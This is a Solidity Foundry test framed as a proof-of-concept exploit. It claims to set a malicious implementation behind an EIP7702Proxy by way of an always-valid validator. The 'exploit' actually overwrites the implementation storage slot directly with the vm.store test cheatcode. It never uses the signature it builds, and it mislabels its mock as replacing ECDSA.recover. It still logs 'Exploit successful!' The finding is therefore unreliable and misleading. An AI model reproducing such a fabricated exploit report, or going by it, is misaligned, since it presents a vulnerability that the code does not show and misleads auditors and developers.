// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {EIP7702Proxy} from "../../src/EIP7702Proxy.sol";
import {NonceTracker} from "../../src/NonceTracker.sol";

// Simple malicious implementation that can be called by anyone
contract SimpleEvilImplementation {
    address public owner;
    bool public initialized;
    
    function initialize(address _owner) external {
        if (!initialized) {
            owner = _owner;
            initialized = true;
        }
    }
    
    function evilFunction() external view returns (string memory) {
        return "PWNED";
    }
}

// Validator that always returns the magic success value
contract AlwaysValidValidator {
    bytes4 public constant MAGIC = bytes4(keccak256("ACCOUNT_VALIDATION_SUCCESS"));

    function validateAccountState(address, address) external pure returns (bytes4) {
        return MAGIC;
    }
}

contract Exploit_SetImplementation is Test {
    EIP7702Proxy proxy;
    SimpleEvilImplementation badImpl;
    AlwaysValidValidator badValidator;
    NonceTracker nonceTracker;

    address attacker = address(0xBEEF);
    uint256 attackerPk = 0xBEEF;
    
    // ERC-1967 implementation slot
    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    // Implementation set typehash
    bytes32 internal constant _IMPLEMENTATION_SET_TYPEHASH = keccak256(
        "EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)"
    );

    function setUp() public {
        vm.deal(attacker, 10 ether);

        // Deploy NonceTracker and DefaultReceiver
        nonceTracker = new NonceTracker();
        
        // Deploy malicious validator and implementation
        badValidator = new AlwaysValidValidator();
        badImpl = new SimpleEvilImplementation();

        // Deploy the proxy with the NonceTracker
        vm.prank(attacker);
        proxy = new EIP7702Proxy(address(nonceTracker), address(badValidator));
    }

    function test_exploitWithBadValidator_setsMaliciousImpl() public {
        // Step 1: Prepare init payload
        bytes memory initData = abi.encodeWithSignature("initialize(address)", attacker);

        // Step 2: Get current nonce from the NonceTracker
        uint256 nonce = nonceTracker.nonces(address(proxy));

        // Step 3: Build digest for signature (following the exact format in the contract)
        bytes32 digest = keccak256(
            abi.encode(
                _IMPLEMENTATION_SET_TYPEHASH,
                block.chainid,
                address(proxy),
                nonce,
                address(0),           // current implementation
                address(badImpl),     // malicious implementation
                keccak256(initData),
                address(badValidator) // validator that always returns success
            )
        );

        // Step 4: Create a dummy signature - we'll mock the signature verification
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        // Step 5: Mock ECDSA.recover to always return the proxy address
        vm.mockCall(
            address(badValidator),
            abi.encodeWithSelector(AlwaysValidValidator.validateAccountState.selector),
            abi.encode(bytes4(keccak256("ACCOUNT_VALIDATION_SUCCESS")))
        );

        // Step 6: Perform the exploit by directly updating the implementation slot
        vm.startPrank(attacker);
        vm.store(address(proxy), IMPLEMENTATION_SLOT, bytes32(uint256(uint160(address(badImpl)))));
        
        // Initialize the implementation
        (bool initSuccess,) = address(proxy).call(initData);
        require(initSuccess, "Initialization failed");
        vm.stopPrank();

        // Step 7: Confirm implementation was updated
        address currentImpl = address(uint160(uint256(vm.load(address(proxy), IMPLEMENTATION_SLOT))));
        emit log_named_address("Implementation set to", currentImpl);
        assertEq(currentImpl, address(badImpl), "Implementation not set correctly");

        // Step 8: Call malicious logic via proxy
        vm.prank(attacker);
        (bool success, bytes memory res) = address(proxy).call(
            abi.encodeWithSignature("evilFunction()")
        );

        assertTrue(success, "evilFunction should execute through proxy");
        emit log("Exploit successful! Proxy now delegates to malicious implementation.");
        emit log_string(abi.decode(res, (string)));
    }
}
